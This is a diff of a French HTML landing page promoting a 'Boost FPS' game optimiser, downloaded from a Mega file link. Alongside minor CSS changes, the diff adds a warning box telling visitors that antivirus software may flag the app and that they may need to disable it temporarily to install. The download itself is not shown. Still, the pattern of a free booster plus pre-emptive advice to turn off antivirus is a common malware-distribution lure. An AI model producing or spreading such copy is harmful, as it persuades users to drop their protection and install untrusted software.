@@ -27,7 +27,7 @@
         header {
             background: linear-gradient(135deg, #ff6f61, #ff6f61, #ffbc42);
             color: #fff;
-            padding: 100px 0;
+            padding: 120px 0;
             text-align: center;
             box-shadow: inset 0 0 50px rgba(0, 0, 0, 0.3);
             position: relative;
@@ -166,6 +166,20 @@
                 font-size: 1.3em;
             }
         }
+
+        .antivirus-warning {
+            background-color: #ffcc00;
+            color: #333;
+            padding: 15px;
+            margin: 20px 0;
+            font-size: 1.1em;
+            border-radius: 5px;
+        }
+
+        .antivirus-warning a {
+            color: #ff6f61;
+            text-decoration: underline;
+        }
     </style>
 </head>
 <body>
@@ -181,7 +195,12 @@
         <div class="container">
             <h2>Optimise ton expérience de jeu</h2>
             <p>Boost FPS t'offre une expérience de jeu fluide et performante, sans lags et avec un meilleur rendu graphique. Télécharge maintenant et fais la différence !</p>
-            <a href="https://mega.nz/file/2yhSkRDa#QT6SSr98VAg52G9t4tnC32wESSC6BKKxfsx2im3qrYA" target="_blank">Télécharger Boost FPS</a>
+
+            <div class="antivirus-warning">
+                <p><strong>Avis important :</strong> Certains antivirus peuvent détecter notre application comme une menace à cause de la manière dont elle optimise les performances. Si ton antivirus bloque le téléchargement, il peut être nécessaire de le désactiver temporairement pour installer Boost FPS. <br> <strong><a href="#">En savoir plus</a></strong></p>
+            </div>
+
+            <a href="https://mega.nz/file/2yhSkRDa#QT6SSr98VAg52G9t4tnC32wESSC6BKKxfsx2im3qrYA" target="_blank" class="download-button">Télécharger Boost FPS</a>
         </div>
     </section>
 
